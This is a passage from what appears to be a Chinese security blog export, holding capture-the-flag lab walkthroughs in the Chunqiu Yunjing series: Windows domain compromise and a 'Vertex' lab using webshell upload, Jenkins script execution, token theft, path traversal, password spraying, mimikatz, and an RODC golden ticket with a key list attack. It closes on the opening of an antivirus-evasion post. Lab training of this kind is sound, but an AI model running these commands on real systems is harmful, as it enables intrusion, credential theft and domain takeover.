alt=\"image-20250102215350055\"></p>\n<p>netbios扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\\DC01</span><br><span class=\"line\">[*] NetBios 172.22.8.31     XIAORANG\\WIN19-CLIENT</span><br><span class=\"line\">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br></pre></td></tr></table></figure>\n\n<p>发现31为域内机器，所以想法在18机器上利用该rdp会话尝试去反制31这台机器，进程注入到john中，查看会话，反向查看31的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use</span><br><span class=\"line\">dir \\\\tsclient\\c</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250102223216051.png\" alt=\"image-20250102223216051\"></p>\n<p>拿到一个域用户账密，尝试登录域内机器31发现密码过期</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250102224148406.png\" alt=\"image-20250102224148406\"></p>\n<p>通过 SamrUnicodeChangePasswordUser2 修改密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-changepasswd xiaorang.lab&#x2F;Aldrich:&#39;Ald@rLMWuy7Z!#&#39;@172.22.8.15 -newpass &#39;Admin@123456&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250102224734206.png\" alt=\"image-20250102224734206\"></p>\n<p>只能通过 rdesktop 进行rdp域内机器172.22.8.46</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 rdesktop -d xiaorang.lab -u Aldrich -p Admin@123456 172.22.8.46</span><br></pre></td></tr></table></figure>\n\n<p>查询域管，发现两个域管账号，其中一个是当前46的机器账号，所以需要进行提权然后去打域控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250102232754328.png\" alt=\"image-20250102232754328\"></p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p>通过查询镜像劫持注册表项的 ACL，查看到 <code>NT AUTHORITY\\Authenticated Users</code> 经过认证的所有用户，即任何成功登录该计算机的用户，都对该对注册表路径具有修改、创建、读取权限。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Aldrich&gt; $acl &#x3D; Get-Acl -Path &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Optio</span><br><span class=\"line\">ns&quot;; $acl.Access</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : FullControl</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : CREATOR OWNER</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : InheritOnly</span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : SetValue, CreateSubKey, ReadKey</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : NT AUTHORITY\\Authenticated Users</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : None</span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : FullControl</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : NT AUTHORITY\\SYSTEM</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : None</span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : FullControl</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : BUILTIN\\Administrators</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : None</span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : ReadKey</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : BUILTIN\\Users</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : None</span><br><span class=\"line\"></span><br><span class=\"line\">RegistryRights    : ReadKey</span><br><span class=\"line\">AccessControlType : Allow</span><br><span class=\"line\">IdentityReference : APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES</span><br><span class=\"line\">IsInherited       : False</span><br><span class=\"line\">InheritanceFlags  : ContainerInherit</span><br><span class=\"line\">PropagationFlags  : None</span><br></pre></td></tr></table></figure>\n\n<p>添加镜像劫持，提权至 SYSTEM：（键入五下 shift 触发粘滞键 sethc.exe，实际执行 cmd.exe）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; &#x2F;v debugger &#x2F;t reg_sz &#x2F;d c:\\windows\\system32\\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure>\n\n<p>然后mimikatz 抓本地 WIN2016$ 的hash 或者在线 dcsync获取hash，再PTH域控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab&#x2F;Administrator@172.22.8.15</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["云境靶场"]},{"title":"春秋云境-Vertex","url":"/2025/05/30/Vertex/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/70de51a87e4184b6b962b7e535986b72.png\" style=\"zoom:67%;\" />\n\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、RODC攻击 — RODC Golden tickets — Key List Attack</p>\n<p><a href=\"https://shenaniganslabs.io/2023/01/25/RODCs.html\">https://shenaniganslabs.io/2023/01/25/RODCs.html</a></p>\n<p><a href=\"https://whoamianony.top/posts/revisiting-a-abuse-of-read-only-domain-controllers/\">Revisiting a Abuse of Read-Only Domain Controllers (RODCs) | WHOAMI</a></p>\n<p><a href=\"https://adsecurity.org/?p=3592\">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory</a></p>\n<p><a href=\"https://xz.aliyun.com/news/14690\">Kerberos 中针对 RODC 的 Key List Attack 分析</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/362023.html\">只读域控制器RODC是难打还是不能打？</a></p>\n<table>\n<thead>\n<tr>\n<th>192.168.8.146</th>\n<th>shiro</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>192.168.8.9</td>\n<td>VertexSoft/MSSQL</td>\n</tr>\n<tr>\n<td>192.168.8.42</td>\n<td>gitlab</td>\n</tr>\n<tr>\n<td>192.168.8.16</td>\n<td>jenkins</td>\n</tr>\n<tr>\n<td>192.168.8.38</td>\n<td>mysql</td>\n</tr>\n<tr>\n<td>192.168.8.26</td>\n<td>tomcat</td>\n</tr>\n<tr>\n<td>192.168.8.12</td>\n<td>RODC:VERTEXSOFT\\RODC</td>\n</tr>\n<tr>\n<td>192.168.1.11</td>\n<td>DC:VERTEXSOFT</td>\n</tr>\n</tbody></table>\n<h1 id=\"heapdump\"><a href=\"#heapdump\" class=\"headerlink\" title=\"heapdump\"></a>heapdump</h1><p>heapdump + shiro</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure>\n\n<p>反向不出网，走suo5或者其他，内网扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]192.168.8.26</span><br><span class=\"line\">   [-&gt;]WIN-PC3788</span><br><span class=\"line\">   [-&gt;]192.168.8.26</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]192.168.8.38</span><br><span class=\"line\">   [-&gt;]WIN-OPS88</span><br><span class=\"line\">   [-&gt;]192.168.8.38</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]192.168.8.9</span><br><span class=\"line\">   [-&gt;]WIN-IISSERER</span><br><span class=\"line\">   [-&gt;]192.168.8.9</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]192.168.8.12</span><br><span class=\"line\">   [-&gt;]RODC</span><br><span class=\"line\">   [-&gt;]192.168.8.12</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]192.168.8.16</span><br><span class=\"line\">   [-&gt;]WIN-SERVER03</span><br><span class=\"line\">   [-&gt;]192.168.8.16</span><br><span class=\"line\">[*] NetBios: 192.168.8.26    WORKGROUP\\WIN-PC3788           </span><br><span class=\"line\">[*] NetBios: 192.168.8.12    [+]DC VERTEXSOFT\\RODC          </span><br><span class=\"line\">[*] NetBios: 192.168.8.16    WORKGROUP\\WIN-SERVER03         </span><br><span class=\"line\">[*] NetBios: 192.168.8.38    WORKGROUP\\WIN-OPS88            </span><br><span class=\"line\">[*] NetBios: 192.168.8.9     WORKGROUP\\WIN-IISSERER         </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"mysql弱口令\"><a href=\"#mysql弱口令\" class=\"headerlink\" title=\"mysql弱口令\"></a>mysql弱口令</h1><p>sqlmap + udf提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -d &quot;mysql:&#x2F;&#x2F;root:123456@192.168.8.38:3306&#x2F;mysql&quot; --os-shell </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529213520519.png\" alt=\"image-20250529213520519\"></p>\n<h1 id=\"Tomcat-PUT\"><a href=\"#Tomcat-PUT\" class=\"headerlink\" title=\"Tomcat PUT\"></a>Tomcat PUT</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PUT &#x2F;backup&#x2F;upload&#x2F;1.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.8.26:8080</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,</span><br><span class=\"line\">*&#x2F;*</span><br><span class=\"line\">;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</span><br><span class=\"line\">Accept-Encoding: gzip, deflate, br</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 612</span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n\n<p>shell url：<a href=\"http://192.168.8.26:8080/backup/1.jsp\">http://192.168.8.26:8080/backup/1.jsp</a>  土豆提权</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529214521355.png\" alt=\"image-20250529214521355\"></p>\n<h1 id=\"jenkins\"><a href=\"#jenkins\" class=\"headerlink\" title=\"jenkins\"></a>jenkins</h1><p>admin/admin123弱口令，/manage/script 命令执行，workgroup直接不深入看了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">println &quot;cmd.exe &#x2F;c type C:\\\\Users\\\\administrator\\\\flag\\\\flag.txt&quot;.execute().text</span><br><span class=\"line\">println &quot;whoami&quot;.execute().text</span><br><span class=\"line\">println &quot;hostname&quot;.execute().text</span><br><span class=\"line\">println &quot;systeminfo&quot;.execute().text</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"gitlab\"><a href=\"#gitlab\" class=\"headerlink\" title=\"gitlab\"></a>gitlab</h1><p>翻jenkins有GitLab API token，解码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp&#x2F;rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;&quot;).getPlainText())</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529215439202.png\" alt=\"image-20250529215439202\"></p>\n<p>拿到token后，通过gitlab v4 api 获取所有项目</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Private-Token: glpat-bGEgHAJDvwaPP78rsLeS&quot; http:&#x2F;&#x2F;192.168.8.42&#x2F;api&#x2F;v4&#x2F;projects?simple&#x3D;true</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529215618722.png\" alt=\"image-20250529215618722\"></p>\n<p>clone项目</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone http:&#x2F;&#x2F;192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42&#x2F;vertexsoft&#x2F;vertexsoftbackup.git</span><br><span class=\"line\">git clone http:&#x2F;&#x2F;192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42&#x2F;vertexsoft&#x2F;hexo.git</span><br><span class=\"line\">git clone http:&#x2F;&#x2F;192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42&#x2F;vertexsoft&#x2F;vertexapp.git</span><br><span class=\"line\">git clone http:&#x2F;&#x2F;192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42&#x2F;vertexsoft&#x2F;erp_old.git</span><br><span class=\"line\">git clone http:&#x2F;&#x2F;192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42&#x2F;vertexsoft&#x2F;portalcode.git</span><br></pre></td></tr></table></figure>\n\n<p>翻文件，在vertexsoftbackup的backup.txt有flag</p>\n<h1 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h1><p>portalcode项目是另一个靶机源码，逻辑漏洞注册admin</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529220057943.png\" alt=\"image-20250529220057943\"></p>\n<p>目录穿越文件下载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET &#x2F;User&#x2F;DownloadFile?download&#x3D;Export&amp;fileName&#x3D;..&#x2F;Web.Config</span><br></pre></td></tr></table></figure>\n\n<p>拿到mssql密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sa&#x2F;Sa1pYbSM!dsQ</span><br></pre></td></tr></table></figure>\n\n<p>MDUT + 土豆提权</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529220637653.png\" alt=\"image-20250529220637653\"></p>\n<h1 id=\"内网喷洒\"><a href=\"#内网喷洒\" class=\"headerlink\" title=\"内网喷洒\"></a>内网喷洒</h1><p>在mysql机器上发现域内用户+密码的csv文件，经典密码过期</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nxc.exe smb 192.168.8.12 -u user.txt -p pass.txt</span><br><span class=\"line\">NathanZen:rXjfpYRn?Q</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529221939202.png\" alt=\"image-20250529221939202\"></p>\n<p>修改密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q rdesktop 192.168.8.12 -d vertexsoft.local -u NathanZen -p rXjfpYRn?Q -z</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529222406224.png\" alt=\"image-20250529222406224\"></p>\n<p>定位DC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\system32&gt;ping DC.vertexsoft.local</span><br><span class=\"line\"></span><br><span class=\"line\">Pinging DC.vertexsoft.local [192.168.1.11] with 32 bytes of data:</span><br><span class=\"line\">Reply from 192.168.1.11: bytes&#x3D;32 time&lt;1ms TTL&#x3D;128</span><br><span class=\"line\">Reply from 192.168.1.11: bytes&#x3D;32 time&lt;1ms TTL&#x3D;128</span><br><span class=\"line\"></span><br><span class=\"line\">Ping statistics for 192.168.1.11:</span><br><span class=\"line\">    Packets: Sent &#x3D; 2, Received &#x3D; 2, Lost &#x3D; 0 (0% loss),</span><br><span class=\"line\">Approximate round trip times in milli-seconds:</span><br><span class=\"line\">    Minimum &#x3D; 0ms, Maximum &#x3D; 0ms, Average &#x3D; 0ms</span><br><span class=\"line\">Control-C</span><br></pre></td></tr></table></figure>\n\n<p>简单信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\system32&gt;net localgroup administrators</span><br><span class=\"line\">Alias name     administrators</span><br><span class=\"line\">Comment        Administrators have complete and unrestricted access to the computer&#x2F;domain</span><br><span class=\"line\"></span><br><span class=\"line\">Members</span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">Administrator</span><br><span class=\"line\">Domain Admins</span><br><span class=\"line\">Enterprise Admins</span><br><span class=\"line\">The command completed successfully.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;whoami</span><br><span class=\"line\">vertexsoft\\nathanzen</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;net user nathanzen &#x2F;domain</span><br><span class=\"line\">User name                    NathanZen</span><br><span class=\"line\">Full Name</span><br><span class=\"line\">Comment</span><br><span class=\"line\">User&#39;s comment</span><br><span class=\"line\">Country&#x2F;region code          000 (System Default)</span><br><span class=\"line\">Account active               Yes</span><br><span class=\"line\">Account expires              Never</span><br><span class=\"line\"></span><br><span class=\"line\">Password last set            7&#x2F;17&#x2F;2024 12:56:17 PM</span><br><span class=\"line\">Password expires             8&#x2F;28&#x2F;2024 12:56:17 PM</span><br><span class=\"line\">Password changeable          7&#x2F;18&#x2F;2024 12:56:17 PM</span><br><span class=\"line\">Password required            Yes</span><br><span class=\"line\">User may change password     Yes</span><br><span class=\"line\"></span><br><span class=\"line\">Workstations allowed         All</span><br><span class=\"line\">Logon script</span><br><span class=\"line\">User profile</span><br><span class=\"line\">Home directory</span><br><span class=\"line\">Last logon                   5&#x2F;29&#x2F;2025 10:26:07 PM</span><br><span class=\"line\"></span><br><span class=\"line\">Logon hours allowed          All</span><br><span class=\"line\"></span><br><span class=\"line\">Local Group Memberships</span><br><span class=\"line\">Global Group memberships     *RODC Admins          *Domain Users</span><br><span class=\"line\">The command completed successfully.</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;net group &quot;RODC Admins&quot; &#x2F;domain</span><br><span class=\"line\">Group name     RODC Admins</span><br><span class=\"line\">Comment</span><br><span class=\"line\"></span><br><span class=\"line\">Members</span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">CharlieCloud             IsabellaTech             LucasEther</span><br><span class=\"line\">MargaretStorm            NathanZen                OliviaVoid</span><br><span class=\"line\">SamuelStorm              VictoriaVoid</span><br><span class=\"line\">The command completed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>发现当前用户是 RODC Admins 组，能管理RODC</p>\n<h1 id=\"RODC\"><a href=\"#RODC\" class=\"headerlink\" title=\"RODC\"></a>RODC</h1><blockquote>\n<p> 攻击思路：如果有修改RODC属性的权限，可以修改两个关键属性，将域管添加到 msDS-RevealOnDemandGroup 属性中，然后抓取RODC的krbtgt_xxxxx账号凭证，伪造域管的金票，随后发起TGS-REQ（包含KERB-KEY-LIST-REQ），这时域控会回给RODC一个KERB-KEY-LIST-REP包，该包内含有域管的凭证</p>\n</blockquote>\n<p>通过密码喷洒成功登录了RODC机器，那么可以修改关键的 Active Directory 属性，包括 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup。通过这种修改，<strong>攻击者可以配置 RODC 来缓存并获取不应被获取的高权限用户凭证</strong>。</p>\n<p>通过 PowerView.ps1 清空 msDS-NeverRevealGroup 属性：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module .\\PowerView.ps1</span><br><span class=\"line\">Set-DomainObject -Identity &#39;CN&#x3D;RODC,OU&#x3D;Domain Controllers,DC&#x3D;vertexsoft,DC&#x3D;local&#39; -Clear &#39;msDS-NeverRevealGroup&#39;</span><br></pre></td></tr></table></figure>\n\n<p>将域管添加到 msDS-RevealOnDemandGroup 属性中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-DomainObject -Identity &#39;CN&#x3D;RODC,OU&#x3D;Domain Controllers,DC&#x3D;vertexsoft,DC&#x3D;local&#39; -Set @&#123;&#39;msDS-RevealOnDemandGroup&#39;&#x3D;@(&#39;CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;vertexsoft,DC&#x3D;local&#39;)&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529223428918.png\" alt=\"image-20250529223428918\"></p>\n<p>查询一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Get-DomainObject -Identity RODC$</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529231401277.png\" alt=\"image-20250529231401277\"></p>\n<p>当获得RODC管理员权限时，可以dump缓存在RODC中的凭据，例如krbtgt凭据，因此可以伪造一个RODC的黄金票据。这里使用Rubeus来创建一个黄金票据需要如下信息：</p>\n<ul>\n<li>rodcNumber代表RODC中krbtgt的密钥版本号</li>\n<li>rc4或aes256</li>\n<li>id为要制作票据用户的rid</li>\n<li>最后还需要域名和域内sid的值</li>\n</ul>\n<p>密钥版本信息可以这样查看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\system32&gt;Get-ADComputer RODC -Properties msDS-KrbTgtLink                                                 </span><br><span class=\"line\"></span><br><span class=\"line\">DistinguishedName : CN&#x3D;RODC,OU&#x3D;Domain Controllers,DC&#x3D;vertexsoft,DC&#x3D;local</span><br><span class=\"line\">DNSHostName       : RODC.vertexsoft.local</span><br><span class=\"line\">Enabled           : True</span><br><span class=\"line\">msDS-KrbTgtLink   : CN&#x3D;krbtgt_4156,CN&#x3D;Users,DC&#x3D;vertexsoft,DC&#x3D;local</span><br><span class=\"line\">Name              : RODC</span><br><span class=\"line\">ObjectClass       : computer</span><br><span class=\"line\">ObjectGUID        : e8a6323d-bf5c-438c-b6bd-5eb00b0250fa</span><br><span class=\"line\">SamAccountName    : RODC$</span><br><span class=\"line\">SID               : S-1-5-21-1670446094-1720415002-1380520873-1106</span><br><span class=\"line\">UserPrincipalName :</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Windows\\system32&gt;Get-ADUser krbtgt_4156 -Properties msDS-SecondaryKrbTgtNumber,msDS-KrbTGTLinkBl</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DistinguishedName          : CN&#x3D;krbtgt_4156,CN&#x3D;Users,DC&#x3D;vertexsoft,DC&#x3D;local</span><br><span class=\"line\">Enabled                    : False</span><br><span class=\"line\">GivenName                  :</span><br><span class=\"line\">msDS-KrbTGTLinkBl          : &#123;CN&#x3D;RODC,OU&#x3D;Domain Controllers,DC&#x3D;vertexsoft,DC&#x3D;local&#125;</span><br><span class=\"line\">msDS-SecondaryKrbTgtNumber : 4156</span><br><span class=\"line\">Name                       : krbtgt_4156</span><br><span class=\"line\">ObjectClass                : user</span><br><span class=\"line\">ObjectGUID                 : f72de4ed-84c3-4b2d-b6d0-05d55795b8cf</span><br><span class=\"line\">SamAccountName             : krbtgt_4156</span><br><span class=\"line\">SID                        : S-1-5-21-1670446094-1720415002-1380520873-1107</span><br><span class=\"line\">Surname                    :</span><br><span class=\"line\">UserPrincipalName          :</span><br></pre></td></tr></table></figure>\n\n<p>所以先通过mimikatz获取这些信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;Privilege::Debug&quot; &quot;log&quot; &quot;lsadump::lsa &#x2F;patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250529223540971.png\" alt=\"image-20250529223540971\"></p>\n<p>构造golden ticket</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe golden &#x2F;rodcNumber:4156 &#x2F;rc4:34e335179246ef930dc33fd1e3de6e9e &#x2F;user:administrator &#x2F;id:500 &#x2F;domain:vertexsoft.local &#x2F;sid:S-1-5-21-1670446094-1720415002-1380520873 &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p>之后将这个黄金票据用于向域控发送kebtgt服务的TGS-REQ，TGS-REQ包含 <strong>Key List Request(KERB-KEY-LIST-REQ)结构</strong>，该结构用于请求KDC 可以提供给客户端的密钥类型列表。<strong>如果目标账户在RODC的 msDS-RevealOnDemandGroup 属性中且不在 msDS-NeverRevealGroup 属性中，TGS-REP将返回一个包含目标用户凭证的KERB-KEY-LIST-REP结构，解密后可以获得其hash从而进行PTH。</strong></p>\n<p>使用Rubeus发起key list攻击</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe asktgs &#x2F;enctype:rc4 &#x2F;keyList &#x2F;service:krbtgt&#x2F;vertexsoft.local &#x2F;dc:DC.vertexsoft.local &#x2F;ticket:doIFpj...</span><br></pre></td></tr></table></figure>\n\n<p>这一步有问题？一直没成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250530000733103.png\" alt=\"image-20250530000733103\"></p>\n<p>后来重新拉取了最新的编译了一下可以了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250530005338955.png\" alt=\"image-20250530005338955\"></p>\n<p>PTH DC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python wmiexec.py -hashes :EBC447441306783742EE3DF769051B75 VERTEXSOFT.LOCAL&#x2F;administrator@192.168.1.11</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["云境靶场"]},{"title":"初探java加载动态链接库","url":"/2024/11/07/java-dll/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前两天学习了DLL，又看到了文章，利用java加载动态链接库绕过杀软：<a href=\"http://payloads.online/archivers/2022-08-11/1/\">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>\n<p>后部分的内容有点深入，所以浅显的学习一下整体思路。环境：jdk1.8_181、win11、vs2022、win10</p>\n<h1 id=\"java加载动态链接库\"><a href=\"#java加载动态链接库\" class=\"headerlink\" 